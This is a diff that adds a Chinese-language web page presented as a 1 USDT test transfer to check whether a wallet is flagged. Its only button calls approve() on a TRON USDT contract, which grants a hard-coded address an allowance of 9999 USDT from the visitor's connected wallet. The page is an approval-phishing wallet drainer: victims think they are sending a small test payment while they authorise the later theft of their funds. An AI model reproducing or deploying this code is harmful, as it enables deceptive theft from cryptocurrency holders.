@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>转账1USDT测试是否被标记</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f5f5f5;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin: 10px;
+      border: none;
+      background-color: #2196F3;
+      color: white;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #0b7dda;
+    }
+  </style>
+</head>
+<body>
+  <h1>转账1USDT测试是否被标记</h1>
+  <button onclick="approve()">转账</button>
+
+  <script>
+    const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+    const TO_ADDRESS = "TQfrsE1L52PCKq9YWyU3cvFF19xu5EPPsP";
+
+    async function approve() {
+      if (!window.tronWeb) {
+        alert("钱包未连接");
+        return;
+      }
+
+      try {
+        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        const result = await contract.approve(TO_ADDRESS, window.tronWeb.toSun(9999)).send();
+        alert("授权成功，交易哈希: " + result);
+      } catch (e) {
+        alert("授权失败: " + e.message);
+      }
+    }
+  </script>
+</body>
+</html>
